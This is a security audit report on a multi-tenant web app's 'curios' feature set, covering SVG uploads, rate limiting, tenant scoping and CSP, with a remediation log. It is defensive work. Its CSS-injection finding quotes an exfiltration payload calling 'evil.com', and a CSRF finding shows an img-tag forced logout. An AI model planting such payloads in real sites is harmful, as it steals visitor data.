# HAWK SECURITY ASSESSMENT

## Executive Summary

**Target:** Grove Engine — Curios System (18 curios, Tiers 1-4)
**Scope:** All curio API routes, admin pages, types/utils, migrations, hooks, error handling, and supporting infrastructure
**Date:** 2026-02-14
**Assessor:** Hawk Survey (comprehensive code-level security assessment)
**Overall Risk Rating:** MEDIUM

The curios system demonstrates a **strong security foundation** — consistent auth checks, parameterized SQL everywhere, a three-layer CSRF defense, well-scoped cookies, strict CSP with nonce-based scripts, and a robust error catalog that never leaks internals. However, the hawk spotted patterns that could be exploited at scale: missing rate limiting on 40+ endpoints, unbounded queries without pagination, unsanitized SVG uploads, and several defense-in-depth gaps in tenant scoping.

### Key Findings

| Severity | Count |
| -------- | ----- |
| Critical | 0     |
| High     | 4     |
| Medium   | 5     |
| Low      | 5     |
| Info     | 4     |

### Top 3 Risks

1. **Unsanitized SVG uploads** — Custom uploads accepts `image/svg+xml` without calling the existing `sanitizeSVG()` function, enabling stored XSS via the CDN
2. **No rate limiting on 40+ API endpoints** — Rate limit middleware exists but is only used by 2 endpoints; all public curio GETs and admin writes are unprotected
3. **Unbounded queries without pagination** — 13 list endpoints return all records with no LIMIT clause, enabling D1 resource exhaustion

---

## Threat Model

### STRIDE Analysis

| Component             | S   | T   | R   | I   | D   | E   | Priority |
| --------------------- | --- | --- | --- | --- | --- | --- | -------- |
| Auth flow (Heartwood) | .   | .   | .   | .   | .   | .   | LOW      |
| Curio API routes      | .   | .   | ?   | .   | !   | .   | HIGH     |
| Admin pages (Arbor)   | .   | .   | ?   | .   | .   | .   | LOW      |
| File uploads          | .   | !   | .   | !   | !   | .   | HIGH     |
| Tenant isolation      | .   | .   | .   | ?   | .   | ?   | MEDIUM   |
| Public GET endpoints  | .   | .   | .   | .   | !   | .   | HIGH     |
| Error handling        | .   | .   | .   | .   | .   | .   | LOW      |

Legend: **!** = likely threat, **?** = needs investigation, **.** = low risk

### Trust Boundaries

```
UNTRUSTED                    TRUST BOUNDARY                    TRUSTED
─────────────────────────────────┼──────────────────────────────────
Browser / Visitor                │  hooks.server.ts (tenant + auth)
                                 │
Authenticated Admin              │  API Routes (+server.ts)
                                 │
Uploaded SVG/Image content       │  R2 storage → CDN serving
                                 │
Tenant A's data                  │  Tenant B's data (tenant_id WHERE)
                                 │
SvelteKit server                 │  Heartwood Auth (service binding)
```

### Data Classification

| Data Type         | Classification | Storage       | Notes                                 |
| ----------------- | -------------- | ------------- | ------------------------------------- |
| Session tokens    | CRITICAL       | Cookies / KV  | HttpOnly, Secure, SameSite            |
| CSRF tokens       | HIGH           | Cookie + HMAC | Session-bound, constant-time compare  |
| Tenant config     | MEDIUM         | D1            | Upsert patterns, tenant-scoped        |
| User content      | MEDIUM         | D1 + R2       | Blog posts, uploads, curio items      |
| SVG uploads       | HIGH           | R2            | **Unsanitized — can contain scripts** |
| Public curio data | LOW            | D1            | Cached GET responses                  |

---

## Findings

### HIGH

#### [HAWK-001] Unsanitized SVG Uploads Enable Stored XSS

| Field          | Value                                                                                           |
| -------------- | ----------------------------------------------------------------------------------------------- |
| **Severity**   | HIGH                                                                                            |
| **Domain**     | File Upload Security / Input Validation                                                         |
| **Location**   | `src/lib/curios/customuploads/index.ts:57-62`, `src/routes/api/curios/customuploads/+server.ts` |
| **Confidence** | HIGH                                                                                            |
| **OWASP**      | A03:2021 Injection                                                                              |

**Description:**
The custom uploads curio allows `image/svg+xml` in its `ALLOWED_MIME_TYPES`. SVGs can contain `<script>` tags, `onload` event handlers, and `<foreignObject>` elements. A robust `sanitizeSVG()` function exists at `src/lib/utils/sanitize.ts:291-384` (using DOMPurify with SVG profiles), but it is **never called** in the upload flow.

The main storage service (`src/lib/server/services/storage.ts:136`) correctly blocked SVG with the comment `// REMOVED - XSS risk`. The curio upload endpoint reintroduces this risk.

Additionally, `image/svg+xml` is not in the `dangerousTypes` array in `buildFileHeaders`, so SVGs are served with `Content-Disposition: inline` — meaning browsers will render and execute them.

**Impact:**
A tenant admin could upload a malicious SVG that executes JavaScript when viewed directly on the CDN origin. While cross-origin isolation limits the blast radius, this is still stored XSS on Grove infrastructure.

**Remediation:**
Either (a) remove `image/svg+xml` from `ALLOWED_MIME_TYPES` (matching the main storage service's decision), or (b) apply `sanitizeSVG()` to SVG content before R2 storage AND add `image/svg+xml` to `dangerousTypes` for forced `Content-Disposition: attachment`.

---

#### [HAWK-002] No Rate Limiting on 40+ Curio API Endpoints

| Field          | Value                                                                                             |
| -------------- | ------------------------------------------------------------------------------------------------- |
| **Severity**   | HIGH                                                                                              |
| **Domain**     | Rate Limiting & Resource Controls                                                                 |
| **Location**   | All `src/routes/api/curios/*/+server.ts` (except guestbook, timeline/generate, timeline/backfill) |
| **Confidence** | HIGH                                                                                              |
| **OWASP**      | A04:2021 Insecure Design                                                                          |

**Description:**
The rate limit middleware at `src/lib/server/rate-limits/middleware.ts` (`checkRateLimit`, KV-backed) is well-built but only used by 2 endpoints (timeline generate and backfill). The guestbook has its own IP-hash dedup. All other 40+ endpoints — including all public GETs and all admin POST/PATCH/DELETE operations — have zero rate limiting.

**Impact:**

- **Public GET endpoints:** An attacker can hammer any tenant's curio APIs to exhaust D1 read quotas
- **Admin write endpoints:** A compromised session can create unlimited items per second
- **Hit counter specifically:** Every GET request performs a D1 write (`INSERT ... ON CONFLICT DO UPDATE`) with `Cache-Control: no-store` — this is a free write amplification vector

**Remediation:**
Apply the existing `checkRateLimit` middleware to:

- All public GET endpoints (e.g., 60 req/min per IP)
- All admin write endpoints (e.g., 30 req/min per user)
- Hit counter increment specifically (e.g., 1 write per IP per 10s)

---

#### [HAWK-003] Unbounded Queries Without Pagination on 13 Endpoints

| Field          | Value                             |
| -------------- | --------------------------------- |
| **Severity**   | HIGH                              |
| **Domain**     | Rate Limiting & Resource Controls |
| **Location**   | See list below                    |
| **Confidence** | HIGH                              |
| **OWASP**      | A04:2021 Insecure Design          |

**Description:**
13 list endpoints return ALL records matching a tenant with no LIMIT clause or pagination support:

- `blogroll` GET, `bookmarkshelf` GET (2 queries), `shrines` GET, `webring` GET, `artifacts` GET, `clipart` GET, `statusbadge` GET, `badges` GET, `linkgarden` GET (2 queries), `customuploads` GET, `gallery/tags` GET

Several other endpoints (guestbook, polls, gallery, timeline, journey) correctly implement pagination with LIMIT/OFFSET.

**Impact:**
If any tenant's table grows large (through normal use or the unbounded creation issue in HAWK-004), these queries will exhaust D1 resources and Worker CPU limits.

**Remediation:**
Add LIMIT clauses with reasonable maximums. Most curios won't realistically exceed a few hundred items per tenant, so `LIMIT 500` would be a pragmatic safety bound.

---

#### [HAWK-004] No Maximum Item Count on Most Creation Endpoints

| Field          | Value                                                                      |
| -------------- | -------------------------------------------------------------------------- |
| **Severity**   | HIGH                                                                       |
| **Domain**     | Rate Limiting & Resource Controls                                          |
| **Location**   | All curio POST endpoints except badges/custom, customuploads, moodring/log |
| **Confidence** | HIGH                                                                       |
| **OWASP**      | A04:2021 Insecure Design                                                   |

**Description:**
Only 3 curios enforce a maximum item count per tenant:

- Custom badges: `MAX_CUSTOM_BADGES`
- Custom uploads: `MAX_UPLOADS_PER_TENANT`
- Mood ring log: `MAX_LOG_ENTRIES` (with rotation)

All other creation endpoints (blogroll, bookmarks, shelves, shrines, webring, artifacts, clipart, status badges, polls, link gardens, links, guestbook entries, gallery tags) allow unlimited items.

**Impact:**
A malicious authenticated admin (or automated script with a stolen session) could create millions of items, exhausting D1 storage quotas and making unbounded queries (HAWK-003) catastrophic.

**Remediation:**
Add per-tenant maximum counts for each curio. Suggested approach: define `MAX_*_PER_TENANT` constants in each curio's `index.ts`, check count before INSERT.

---

### MEDIUM

#### [HAWK-005] Bookmark DELETE/UPDATE Queries Lack tenant_id in WHERE

| Field          | Value                                                                                                                                   |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**   | MEDIUM                                                                                                                                  |
| **Domain**     | Multi-Tenant Isolation                                                                                                                  |
| **Location**   | `src/routes/api/curios/bookmarkshelf/bookmarks/[id]/+server.ts:115,160` and `src/routes/arbor/curios/bookmarkshelf/+page.server.ts:305` |
| **Confidence** | MEDIUM                                                                                                                                  |
| **OWASP**      | A01:2021 Broken Access Control                                                                                                          |

**Description:**
The bookmarks table lacks a direct `tenant_id` column — ownership is inferred through the shelf FK. The UPDATE and DELETE queries use `WHERE id = ?` without tenant scoping. While the resource is pre-validated via a JOIN-based tenant check, this creates a TOCTOU (time-of-check-time-of-use) window. The admin page's `removeBookmark` action at line 305 has the same pattern.

**Impact:**
Low in practice because no API exists to move bookmarks between shelves, and bookmark IDs are random. But this violates defense-in-depth principles.

**Remediation:**
Add a JOIN-based tenant verification directly in the UPDATE/DELETE queries, or add a `tenant_id` column to the bookmarks table.

---

#### [HAWK-006] Gallery Tags DELETE/UPDATE Queries Lack tenant_id

| Field          | Value                                                   |
| -------------- | ------------------------------------------------------- |
| **Severity**   | MEDIUM                                                  |
| **Domain**     | Multi-Tenant Isolation                                  |
| **Location**   | `src/routes/api/curios/gallery/tags/+server.ts:157,242` |
| **Confidence** | MEDIUM                                                  |
| **OWASP**      | A01:2021 Broken Access Control                          |

**Description:**
Same pattern as HAWK-005. Gallery tag DELETE (`line 157`) and UPDATE (`line 242`) use `WHERE id = ?` without `AND tenant_id = ?`. The tag ID is pre-validated against tenant_id, but the mutation query itself is unscoped.

**Remediation:**
Add `AND tenant_id = ?` to both the DELETE and UPDATE queries.

---

#### [HAWK-007] Poll Votes Queries Lack tenant_id in WHERE

| Field          | Value                                                |
| -------------- | ---------------------------------------------------- |
| **Severity**   | MEDIUM                                               |
| **Domain**     | Multi-Tenant Isolation                               |
| **Location**   | `src/routes/api/curios/polls/[id]/+server.ts:75,103` |
| **Confidence** | MEDIUM                                               |
| **OWASP**      | A01:2021 Broken Access Control                       |

**Description:**
Two poll_votes SELECT queries filter only by `poll_id` without `tenant_id`:

- Line 75: `SELECT selected_options FROM poll_votes WHERE poll_id = ?` (results aggregation)
- Line 103: `SELECT id FROM poll_votes WHERE poll_id = ? AND voter_hash = ?` (duplicate vote check)

The poll itself is pre-validated against tenant_id, so this is safe in practice. But if poll IDs were ever reused or predictable, this could leak cross-tenant vote data.

**Remediation:**
Add `AND tenant_id = ?` to both queries.

---

#### [HAWK-008] No Application-Level Request Body Size Validation

| Field          | Value                                                 |
| -------------- | ----------------------------------------------------- |
| **Severity**   | MEDIUM                                                |
| **Domain**     | Rate Limiting & Resource Controls                     |
| **Location**   | All POST/PATCH endpoints using `await request.json()` |
| **Confidence** | MEDIUM                                                |
| **OWASP**      | A04:2021 Insecure Design                              |

**Description:**
No endpoint checks `Content-Length` before parsing the request body. All 40+ POST/PATCH endpoints use `await request.json()` directly. Cloudflare Workers has a platform-level limit (~100MB), but this is far more than any curio JSON payload needs.

**Remediation:**
Add a body size check in hooks.server.ts for API routes, or add per-endpoint `Content-Length` validation.

---

#### [HAWK-009] Gallery Custom CSS Stored Without Sanitization

| Field          | Value                                                     |
| -------------- | --------------------------------------------------------- |
| **Severity**   | MEDIUM                                                    |
| **Domain**     | Input Validation                                          |
| **Location**   | `src/routes/arbor/curios/gallery/+page.server.ts:196,263` |
| **Confidence** | MEDIUM                                                    |
| **OWASP**      | A03:2021 Injection                                        |

**Description:**
The gallery curio stores a `customCss` field directly from admin input without sanitization. While admin-only, CSS injection in a multi-tenant environment can be used for data exfiltration (e.g., `background: url('https://evil.com/steal?data=' + attr(...))`).

**Remediation:**
Sanitize CSS to a safe subset (remove `url()`, `@import`, `expression()`, etc.) or validate against an allowlist of properties.

---

### LOW

#### [HAWK-010] Missing Cache Headers on 3 Public GET Endpoints

| Field          | Value                                                                                 |
| -------------- | ------------------------------------------------------------------------------------- |
| **Severity**   | LOW                                                                                   |
| **Domain**     | HTTP Security                                                                         |
| **Location**   | `gallery/tags/+server.ts`, `timeline/activity/+server.ts`, `customuploads/+server.ts` |
| **Confidence** | HIGH                                                                                  |

**Description:**
These GET endpoints lack `Cache-Control` headers. `timeline/activity` is public and queries up to 365 rows per request. Without caching, every visitor triggers a full D1 query. `gallery/tags` is also public and unbounded.

**Remediation:**
Add `Cache-Control: public, max-age=60, stale-while-revalidate=120` to these endpoints.

---

#### [HAWK-011] GET-Based Logout Enables CSRF Logout

| Field          | Value                                  |
| -------------- | -------------------------------------- |
| **Severity**   | LOW                                    |
| **Domain**     | CSRF Protection                        |
| **Location**   | `src/routes/auth/logout/+server.ts:75` |
| **Confidence** | HIGH                                   |

**Description:**
`export const GET: RequestHandler = POST;` — The logout endpoint accepts GET requests, which means `<img src="/auth/logout">` on any page could force-logout users. The code has a TODO comment acknowledging this.

**Remediation:**
Remove the GET export, keeping only POST for logout.

---

#### [HAWK-012] CSP Allows style-src 'unsafe-inline'

| Field          | Value                         |
| -------------- | ----------------------------- |
| **Severity**   | LOW                           |
| **Domain**     | HTTP Security                 |
| **Location**   | `src/hooks.server.ts:710-722` |
| **Confidence** | HIGH                          |

**Description:**
`style-src 'self' 'unsafe-inline'` is a common SvelteKit trade-off due to component-level styles. It weakens CSP against CSS injection but is difficult to avoid without significant framework changes.

**Remediation:**
Accept as known trade-off. Consider nonce-based style-src if SvelteKit adds support.

---

#### [HAWK-013] CSP img-src Allows data: URIs

| Field          | Value                         |
| -------------- | ----------------------------- |
| **Severity**   | LOW                           |
| **Domain**     | HTTP Security                 |
| **Location**   | `src/hooks.server.ts:710-722` |
| **Confidence** | LOW                           |

**Description:**
`img-src 'self' https://cdn.grove.place data: blob:` — The `data:` allowance could theoretically be used in CSP bypass chains for data exfiltration, though real-world exploitability is very low.

**Remediation:**
If `data:` URIs for images are not needed, remove from img-src.

---

#### [HAWK-014] Error Handling Inconsistency in Timeline save-token

| Field          | Value                                                                  |
| -------------- | ---------------------------------------------------------------------- |
| **Severity**   | LOW                                                                    |
| **Domain**     | Data Protection                                                        |
| **Location**   | `src/routes/api/curios/timeline/save-token/+server.ts:20-21,36-37,125` |
| **Confidence** | HIGH                                                                   |

**Description:**
Uses raw `throw error()` instead of `throwGroveError()`, and returns `tokenType` value in error messages. Not dangerous (values are from a validated allowlist), but inconsistent with the error catalog pattern.

**Remediation:**
Migrate to `throwGroveError()` for consistency.

---

### INFORMATIONAL

#### [HAWK-015] Tenant Ownership Not Verified in Request Hook

**Location:** `src/hooks.server.ts:424-565`

`locals.user` and `locals.tenantId` are set independently — the hook does not verify the authenticated user owns the tenant they're accessing. Authorization relies entirely on each route checking `locals.user`. **All routes currently do this correctly**, so this is not exploitable, but it's worth noting as an architectural observation.

---

#### [HAWK-016] COEP/COOP Headers Not Set

**Location:** `src/hooks.server.ts:690-722`

`Cross-Origin-Embedder-Policy` and `Cross-Origin-Opener-Policy` are not set. These optional headers would provide additional cross-origin isolation.

---

#### [HAWK-017] strong `unsafe-eval` Scoping

**Location:** `src/hooks.server.ts:295-302`

`unsafe-eval` in CSP is conditionally granted only on routes requiring Monaco Editor or Mermaid diagrams. Internal routes never receive it. This is excellent defense-in-depth.

---

#### [HAWK-018] Robust CSRF Implementation

**Location:** `src/lib/utils/csrf.ts`, `src/hooks.server.ts:567-648`

Three-layer CSRF defense: SvelteKit origin checking, custom proxy-aware origin validation, and session-bound HMAC tokens with constant-time comparison. Fail-closed behavior when neither Origin header nor CSRF token are present.

---

## Domain Scorecard

| Domain           | Rating  | Findings   | Notes                                          |
| ---------------- | ------- | ---------- | ---------------------------------------------- |
| Authentication   | PASS    | 0 findings | Heartwood PKCE, strict session validation      |
| Authorization    | PASS    | 0 findings | Every admin endpoint checks locals.user        |
| Input Validation | PARTIAL | 2 findings | SVG unsanitized, CSS unsanitized               |
| Data Protection  | PASS    | 1 finding  | Minor error inconsistency                      |
| HTTP Security    | PASS    | 2 findings | CSP is strong; minor style-src/data: issues    |
| CSRF Protection  | PASS    | 1 finding  | Excellent 3-layer defense; GET logout is minor |
| Session Security | PASS    | 0 findings | All cookies properly secured                   |
| File Uploads     | PARTIAL | 1 finding  | SVG is the gap                                 |
| Rate Limiting    | FAIL    | 2 findings | Middleware exists but barely used              |
| Multi-Tenant     | PARTIAL | 3 findings | Defense-in-depth gaps in 5 queries             |
| Infrastructure   | PASS    | 0 findings | Secrets in Workers, no public buckets          |
| Heartwood Auth   | PASS    | 0 findings | PKCE, service binding, strict validation       |
| Exotic Vectors   | PASS    | 0 findings | No ReDoS, no prototype pollution, no SSRF      |
| Supply Chain     | PASS    | 0 findings | Lock file committed                            |

---

## Remediation Priority

### Immediate (fix before next deploy)

- **HAWK-001:** Remove SVG from custom uploads ALLOWED_MIME_TYPES, or apply sanitizeSVG()

### Short-term (fix within 1 week)

- **HAWK-002:** Apply rate limiting to public GET and admin write endpoints
- **HAWK-004:** Add per-tenant maximum item counts to creation endpoints

### Medium-term (fix within 1 month)

- **HAWK-003:** Add LIMIT clauses to unbounded queries
- **HAWK-005/006/007:** Add tenant_id to unscoped mutation queries
- **HAWK-008:** Add body size validation
- **HAWK-009:** Sanitize gallery custom CSS
- **HAWK-010:** Add cache headers to missing endpoints

### Long-term (track and plan)

- **HAWK-011:** Remove GET logout
- **HAWK-012/013:** CSP refinement
- **HAWK-014:** Error handling consistency

---

## Positive Observations

The curios system gets a lot right. Acknowledging what's strong:

- **Zero SQL injection surface** — Every single query across 51 route files uses parameterized `.bind()`. Dynamic UPDATE patterns use hardcoded column names only. No string concatenation with user input in SQL anywhere.
- **Consistent auth guard pattern** — Every admin POST/PATCH/DELETE handler follows the three-guard pattern: `!db` → `!tenantId` → `!locals.user`. No endpoints are missing auth checks.
- **Excellent error catalog** — `throwGroveError()` with `adminMessage` (logged server-side) and `userMessage` (sent to client) ensures no internal details leak. Error codes enable debugging without information disclosure.
- **Strong CSP** — Nonce-based script-src, conditional unsafe-eval, frame-ancestors 'none', and all standard hardening headers present.
- **Robust CSRF defense** — Three layers with fail-closed behavior, session-bound HMAC tokens, and constant-time comparison.
- **Cookie security** — Every auth cookie has HttpOnly, Secure (in production), and SameSite=Lax. Domain scoping is correct.
- **Clean sanitization pattern** — HTML stripping functions used consistently across all curios for user text input.
- **Intentionally public endpoints are clearly designed** — Guestbook, hit counter, and poll voting are correctly public with appropriate deduplication.
- **CORS is minimal** — Only font files get `Access-Control-Allow-Origin: *`. No API CORS.

---

## Remediation Summary (Gathering Security — 2026-02-14)

_The hawk returned. Every finding addressed. The gathering has spoken._

| ID       | Severity | Finding                               | Status    | Fix Description                                                                                                    |
| -------- | -------- | ------------------------------------- | --------- | ------------------------------------------------------------------------------------------------------------------ |
| HAWK-001 | HIGH     | SVG uploads unsanitized               | **FIXED** | Removed `image/svg+xml` from `ALLOWED_MIME_TYPES` and `AllowedMimeType` type. SVG case removed from extension map. |
| HAWK-002 | HIGH     | No rate limiting on 40+ endpoints     | **FIXED** | Added global API rate limiting in `hooks.server.ts` — 120 req/min reads, 30 req/min writes per IP. Fails open.     |
| HAWK-003 | HIGH     | Unbounded queries on 13 endpoints     | **FIXED** | Added `LIMIT 500` to all 13 unbounded list queries across 11 files.                                                |
| HAWK-004 | HIGH     | No max item counts                    | **FIXED** | Added `MAX_*_PER_TENANT` constants and count checks before INSERT in 10+ creation endpoints.                       |
| HAWK-005 | MEDIUM   | Bookmark queries lack tenant_id       | **FIXED** | Added `AND shelf_id IN (SELECT id FROM bookmark_shelves WHERE tenant_id = ?)` to UPDATE and DELETE queries.        |
| HAWK-006 | MEDIUM   | Gallery tags lack tenant_id           | **FIXED** | Added `AND tenant_id = ?` to DELETE and UPDATE queries in `gallery/tags/+server.ts`.                               |
| HAWK-007 | MEDIUM   | Poll votes lack tenant_id             | **FIXED** | Added `AND tenant_id = ?` to both SELECT queries in `polls/[id]/+server.ts`.                                       |
| HAWK-008 | MEDIUM   | No request body size validation       | **FIXED** | Added 1MB Content-Length check in `hooks.server.ts` for JSON/form POST/PUT/PATCH requests. Returns 413.            |
| HAWK-009 | MEDIUM   | Gallery CSS unsanitized               | **FIXED** | Added `sanitizeCustomCss()` to `$lib/curios/gallery/index.ts` — strips `url()`, `@import`, `expression()`, etc.    |
| HAWK-010 | LOW      | Missing cache headers                 | **FIXED** | Added `Cache-Control` headers to gallery/tags (60s), timeline/activity (60s), and customuploads (30s private).     |
| HAWK-011 | LOW      | GET logout                            | **FIXED** | Removed `export const GET: RequestHandler = POST` from `auth/logout/+server.ts`. POST-only now.                    |
| HAWK-012 | LOW      | CSP style-src unsafe-inline           | ACCEPTED  | SvelteKit framework requirement — cannot remove without breaking framework styles. Accepted trade-off.             |
| HAWK-013 | LOW      | CSP img-src data: URIs                | ACCEPTED  | Required for inline image previews and SVG data URIs in the UI. Low real-world risk. Accepted.                     |
| HAWK-014 | LOW      | Timeline save-token raw throw error() | **FIXED** | Replaced all `throw error()` with `throwGroveError()` and `logGroveError()`. Consistent error catalog usage.       |
| HAWK-015 | INFO     | Tenant ownership not verified in hook | NOTED     | Defense-in-depth gap. All routes check independently. Low priority — no attack vector without route bypass.        |
| HAWK-016 | INFO     | COEP/COOP headers not set             | NOTED     | Would break legitimate cross-origin embeds (CDN images, auth iframe). Not adding at this time.                     |
| HAWK-017 | INFO     | Good unsafe-eval scoping              | POSITIVE  | Positive observation — no action needed.                                                                           |
| HAWK-018 | INFO     | Robust CSRF implementation            | POSITIVE  | Positive observation — no action needed.                                                                           |

### Remaining Risk

- **HAWK-012/013 (ACCEPTED):** CSP trade-offs inherent to the SvelteKit + Cloudflare architecture. Mitigated by nonce-based script-src and frame-ancestors 'none'.
- **HAWK-015/016 (NOTED):** Defense-in-depth enhancements that would add complexity without addressing exploitable vulnerabilities. Tracked for future review.

### Files Modified

**Security Infrastructure:**

- `src/hooks.server.ts` — Body size validation + global API rate limiting

**Curio Libraries (types/utils):**

- `src/lib/curios/customuploads/index.ts` — SVG removal
- `src/lib/curios/gallery/index.ts` — `sanitizeCustomCss()` + `MAX_CUSTOM_CSS_LENGTH` + `MAX_GALLERY_TAGS_PER_TENANT`
- `src/lib/curios/blogroll/index.ts` — `MAX_BLOGROLL_ENTRIES_PER_TENANT`
- `src/lib/curios/bookmarkshelf/index.ts` — `MAX_SHELVES_PER_TENANT`
- `src/lib/curios/shrines/index.ts` — `MAX_SHRINES_PER_TENANT`
- `src/lib/curios/webring/index.ts` — `MAX_WEBRING_ENTRIES_PER_TENANT`
- `src/lib/curios/artifacts/index.ts` — `MAX_ARTIFACTS_PER_TENANT`
- `src/lib/curios/clipart/index.ts` — `MAX_CLIPART_PLACEMENTS_PER_TENANT`
- `src/lib/curios/polls/index.ts` — `MAX_POLLS_PER_TENANT`
- `src/lib/curios/linkgarden/index.ts` — `MAX_LINK_GARDENS_PER_TENANT`

**API Routes (LIMIT clauses + max item counts + tenant scoping + cache headers):**

- `src/routes/api/curios/blogroll/+server.ts`
- `src/routes/api/curios/bookmarkshelf/+server.ts`
- `src/routes/api/curios/bookmarkshelf/bookmarks/[id]/+server.ts`
- `src/routes/api/curios/shrines/+server.ts`
- `src/routes/api/curios/webring/+server.ts`
- `src/routes/api/curios/artifacts/+server.ts`
- `src/routes/api/curios/clipart/+server.ts`
- `src/routes/api/curios/statusbadge/+server.ts`
- `src/routes/api/curios/badges/+server.ts`
- `src/routes/api/curios/linkgarden/+server.ts`
- `src/routes/api/curios/customuploads/+server.ts`
- `src/routes/api/curios/polls/[id]/+server.ts`
- `src/routes/api/curios/polls/+server.ts`
- `src/routes/api/curios/gallery/tags/+server.ts`
- `src/routes/api/curios/timeline/activity/+server.ts`
- `src/routes/api/curios/timeline/save-token/+server.ts`

**Admin Pages:**

- `src/routes/arbor/curios/gallery/+page.server.ts` — CSS sanitization
- `src/routes/arbor/curios/bookmarkshelf/+page.server.ts` — Tenant-scoped bookmark delete

**Auth:**

- `src/routes/auth/logout/+server.ts` — GET export removed

**Tests:**

- `src/lib/curios/customuploads/index.test.ts` — Updated for SVG removal
- `src/lib/curios/gallery/index.test.ts` — Added `sanitizeCustomCss` tests

---

_Woven tight, audited clean, hardened deep — the forest endures._
